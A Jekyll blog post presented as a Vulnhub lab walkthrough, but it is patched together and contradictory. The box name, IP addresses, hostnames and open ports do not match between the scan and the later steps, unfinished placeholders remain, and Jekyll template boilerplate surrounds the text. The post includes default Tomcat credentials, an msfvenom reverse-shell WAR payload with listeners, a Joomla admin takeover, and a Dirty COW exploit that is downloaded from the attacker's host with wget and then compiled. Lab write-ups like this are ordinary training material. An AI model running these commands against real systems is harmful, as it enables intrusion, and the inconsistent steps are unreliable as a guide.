---
layout: post
title:  "Stapler: Vulnhub Walkthrough"
date:   2015-08-18 15:07:19
categories: [tutorial]
comments: true
---
You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.Sdasdasdas

To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.

<!--more-->
## Information Gathering
We'll start with an nmap `scan`:

![c71464ae.png](/assets/images/posts/wintermute-1-walkthrough/c71464ae.png)
![screenshot 2.png](/img/screenshot 2.png)

```
# nmap -sC -sV -oA nmap/initial -vvv 192.168.227.136
Nmap scan report for 192.168.227.136
Host is up, received arp-response (0.00038s latency).
Scanned at 2019-09-05 18:35:44 AEST for 181s
Not shown: 992 filtered ports
Reason: 992 no-responses
PORT     STATE  SERVICE     REASON         VERSION
20/tcp   closed ftp-data    reset ttl 64
21/tcp   open   ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp   open   ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (UbuntuLinux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
53/tcp   open   domain      syn-ack ttl 64 dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp   open   http        syn-ack ttl 64
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 568
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0;}
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|     </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/nice%20ports%2C/Tri%6Eity.txt%2ebak</code> was not found on this server.</p></body></html>
|   GetRequest, HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 533
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0;}
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|_    </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/</code> was not found on this server.</p></body></html>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?       syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongPassword, IgnoreSigpipes, FoundRows, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1B7\x10\x7F;?\x08CpzK\x08+S\x07r\x13.M\x01
|_  Auth Plugin Name: 88
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.40%I=7%D=9/5%Time=5D70C8F9%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533\
SF:r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</title>
SF:<style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#33333
SF:3;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5em
SF:;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-he
SF:ight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20blac
SF:k;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}\
SF:ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monospa
SF:ce;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h1>
SF:<p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x20w
SF:as\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(HTTP
SF:Options,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2053
SF:3\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</titl
SF:e><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#333
SF:333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5
SF:em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-
SF:height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bl
SF:ack;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20
SF:}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monos
SF:pace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h
SF:1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x2
SF:0was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(Fo
SF:urOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x2
SF:0close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Lengt
SF:h:\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Fou
SF:nd</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:
SF:\x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:
SF:\x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;
SF:\x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20ins
SF:et\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x201
SF:0px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-fami
SF:ly:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20
SF:Found</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/ni
SF:ce%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\x20on\
SF:x20this\x20server\.</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.40%I=7%D=9/5%Time=5D70C8F3%P=x86_64-pc-linux-gnu%r(NULL
SF:,15A8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:9B:56:E3 (VMware)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 9h58m17s, deviation: 0s, median: 9h58m17s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64882/tcp): CLEAN (Timeout)
|   Check 2 (port 25295/tcp): CLEAN (Timeout)
|   Check 3 (port 45431/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40247/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2019-09-05T19:35:01+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  5 18:38:45 2019 -- 1 IP address (1 host up) scanned in 183.81 seconds
```

Just a spoiler there are several ways to get a shell on this box. I'll show you below. There are several http ports open. 
We shall enumerate all of them http ports using dirb.

dirb http://192.168.175.135
This doesn't give much

## Method One: Tomcat

Navigating to http://192.168.175.135:8080 shows that its running a tomcat server. We'll bruteforce for any hidden directories or simply try `/manager` as its common on tomcat

dirb http://192.168.175.135:8080
```
URL_BASE: http://192.168.175.135:8080/
---- Scanning URL: http://192.168.175.135:8080/ ----
==> DIRECTORY: http://192.168.175.135:8080/docs/
==> DIRECTORY: http://192.168.175.135:8080/examples/
==> DIRECTORY: http://192.168.175.135:8080/host-manager/
+ http://192.168.175.135:8080/index.html (CODE:200|SIZE:1895)
==> DIRECTORY: http://192.168.175.135:8080/manager/
==> DIRECTORY: http://192.168.175.135:8080/META-INF/

```

... and what do you know
Going to the manager link
`http://192.168.175.135:8080/manager`
asks for a password. We do have a file that has a passwords for Tomcat servers. We try some default passwords. If not we can try to brute-force using hydra;

#### Insert hydra command here;
We'll use 
username: tomcat 
password:tomcat

and we're in. 
### Insert image here.

Now we know tomcat runs java hence jsp hence we'll use this to generate a payload;
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.227.135 LPORT=80 -f war > rs.war
```
On the attackers box we can either use msfconsole or nc as follows

### Start a listener in msfconsole
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.11.0.250; set LPORT 80; set ExitOnSession false; exploit -j"
```
### Start a nc listener
```
nc -lnvp 80
```
## Method Two: Joomla

We'll follow the same drill. Port 8081 is running Joomla, hence we'll bruteforce for any hidden directories.
dirb http://192.168.175.135:8081 
```
URL_BASE: http://192.168.175.135:8081/
---- Scanning URL: http://192.168.175.135:8081/ ----
==> DIRECTORY: http://192.168.175.135:8081/administrator/
==> DIRECTORY: http://192.168.175.135:8081/cache/
+ http://192.168.175.135:8081/cgi-bin/ (CODE:403|SIZE:292)
==> DIRECTORY: http://192.168.175.135:8081/components/
==> DIRECTORY: http://192.168.175.135:8081/images/
==> DIRECTORY: http://192.168.175.135:8081/includes/
+ http://192.168.175.135:8081/index.php (CODE:200|SIZE:4047)
==> DIRECTORY: http://192.168.175.135:8081/javascript/
==> DIRECTORY: http://192.168.175.135:8081/language/
==> DIRECTORY: http://192.168.175.135:8081/libraries/
==> DIRECTORY: http://192.168.175.135:8081/logs/
==> DIRECTORY: http://192.168.175.135:8081/media/
==> DIRECTORY: http://192.168.175.135:8081/modules/
==> DIRECTORY: http://192.168.175.135:8081/phpmyadmin/
==> DIRECTORY: http://192.168.175.135:8081/plugins/
+ http://192.168.175.135:8081/robots.txt (CODE:200|SIZE:304)
+ http://192.168.175.135:8081/server-status (CODE:403|SIZE:297)
==> DIRECTORY: http://192.168.175.135:8081/templates/
==> DIRECTORY: http://192.168.175.135:8081/tmp/
==> DIRECTORY: http://192.168.175.135:8081/xmlrpc/

```
Another thing we can do is use Joomscan to further enumerate
`joomscan -u http://192.168.175.135:8081`

### iNSERT image
Reading through the log we find that `#15` holds something useful. A  vulnerability exists that allows users to change admin password;

### Insert image

We reset the password and log in;

Once we in as admin. We look for a php file we can edit. To do this;
1. go to Extensions
2. Template Manager
3. Selec the active template
4. Edit the template and save changers.

Once this is done we can execute commands through  the browser. 
As usual we'll use Burp to intercept and execute the payload;

## Other interests
This box is also running `Samba` and we can see from the smb enum script, we can Read/Write into the $IPC Service

```
Host script results:                                                      
| smb-enum-shares:                                                   
|   account_used: guest                                                   
|   IPC$:                                                                 
|     Type: STYPE_IPC_HIDDEN                                              
|     Comment: IPC Service (canyoupwnme server (Samba, Ubuntu))           
|     Users: 1                                                            
|     Max Users: <unlimited>                                              
|     Path: C:\tmp                                                        
|     Anonymous access: READ/WRITE                                        
|     Current user access: READ/WRITE


``` 

## Post Exploitation

```
uname -a
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```
From this kernel version we can attempt a kernel exploit.
It may crash the system but we'll still try it.
We'll attempt to use the dirtycow exploit.
####Add link to dirtycow
```
wget http://192.168.175.132:1234/cowroot.c -O /tmp/cowroot.c
Edit it for either 32bit or 64bit.


python -c "import pty; pty.spawn('/bin/bash');"
gcc -pthread cowroot.c -o cowroot && chmod 744 cowroot && ./cowroot asdf
Once you get a shell enter the following command. chap chap
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

```
Other way is to use the suid bit set.

Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].

[jekyll]:      http://jekyllrb.com
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-help]: https://github.com/jekyll/jekyll-help
